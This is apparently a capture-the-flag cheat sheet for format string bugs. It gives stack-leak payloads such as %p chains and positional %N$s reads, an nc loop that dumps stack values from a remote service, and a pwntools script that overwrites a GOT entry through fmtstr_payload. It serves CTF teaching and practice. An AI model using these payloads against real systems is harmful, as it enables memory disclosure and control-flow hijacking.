# Format string bugs

**Signs**: your input is printed back via `printf(buf)`; sending `%p %p %p` prints hex values.

## Leak
```
%p.%p.%p.%p.%p.%p.%p.%p          stack values (find your own input: AAAAAAAA.%6$p → 0x4141414141414141)
%7$s                             read a string at the address in the 7th argument
%11$p                            canary is often a value ending in 00 near the top
```
Flag on the stack? `for i in $(seq 1 60); do echo "%$i\$p" | nc host port; done` and decode
little-endian hex chunks: `bytes.fromhex(x[2:])[::-1]`.

## Write
`%n` writes the number of chars printed so far to an address you place on the stack →
overwrite GOT entries / return addresses. pwntools: `fmtstr_payload(offset, {addr: value})`.

```python
from pwn import *
io = remote('host', 1337)
io.sendline(fmtstr_payload(6, {e.got['exit']: e.sym['win']}))
```
